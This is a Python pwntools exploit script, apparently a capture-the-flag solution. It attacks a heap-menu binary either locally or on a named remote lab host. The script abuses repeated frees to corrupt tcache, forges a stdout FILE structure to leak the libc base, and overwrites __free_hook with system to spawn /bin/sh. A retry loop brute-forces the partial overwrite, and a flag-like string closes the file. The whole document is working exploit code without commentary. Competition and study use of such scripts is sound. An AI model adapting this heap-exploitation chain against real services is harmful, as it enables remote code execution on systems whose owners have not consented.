from pwn import *
import sys
elf = ELF("pwn.bak")

def choice(c):
	io.sendlineafter(">\n",str(c))
def addB(name,size,data):
	choice(1)
	io.sendafter("name:",name)
	io.sendlineafter("size:",str(size))
	io.sendafter("tion:",data)
def delB(index):
	choice(2)
	io.sendlineafter("index:",str(index))
def addB2(name,size,data):
	io.sendlineafter(">","1")
	io.sendafter("name:",name)
	io.sendlineafter("size:",str(size))
	io.sendafter("tion:",data)
def delB2(index):
	io.sendlineafter(">","2")
	io.sendlineafter("index:",str(index))

if sys.argv[1] == 'l':
	sys_offset = (0x7f8526c3a440-0x00007f8526beb000)
	freehk_offset = (0x7ffaa7e588e8-0x00007ffaa7a6b000)
	pay_suffix = '\x50\x77'
	leak_base = '\x08'
	leak_offset = (0x00007f75a09298b0-0x00007f75a053c000)
elif sys.argv[1] == 'r':
	sys_offset = 0x47dc0#0x41ca0
	freehk_offset = 0x3dc8a8#0x3b18a8
	pay_suffix = '\x10\x77'
	leak_base = '\x40'
	leak_offset = 0x3db740#0x3b0740
else:
	info("INVALID STATUS")
	exit()

while True:
	try:
		if sys.argv[1] == 'l':
			io = process("./pwn.bak")
		else:
			io = remote('1c0e562267cef024c5fea2950a3c9bea.kr-lab.com',40001)
		io.sendafter("username:","admin\n")
		io.sendafter("password:","frame\n")
		addB('0000',0x60,p64(0))#0
		delB(0)
		delB(0)
		delB(0)
		delB(0)
		addB('1111',0x60,'\xb0')#1
		addB('1111',0x60,'\xb0')#2
		addB('1111',0x60,p64(0)+p64(0xa1))#3
		for i in range(7):
			delB(0)
		delB(0)	#0x4b0->unsorted-binls

		delB(3)
		addB('22',0x50,p64(0)+p64(0x61)+pay_suffix)#4
		addB('3333',0x90,'3333')	#5
		addB('3333',0x90,p64(0)*2+p64(0xfbad1c00)+p64(0)*3+leak_base)	#6
		libc_base = u64(io.recv(8))-leak_offset
		success("LIBC BASE %#x"%libc_base)
		delB2(1)
		delB2(1)
		delB2(1)
		addB2('4',0x50,p64(libc_base+freehk_offset))
		addB2('4',0x50,"/bin/sh\x00")
		#gdb.attach(io,"handle SIGALRM nostop noprint\n")
		addB2('5',0x50,p64(libc_base+sys_offset))
		delB2(8)
		io.interactive()
	except Exception:
		io.close()
		info(str(Exception))
'''
icq863a2667c5112c2e20b79a50a92ab
'''
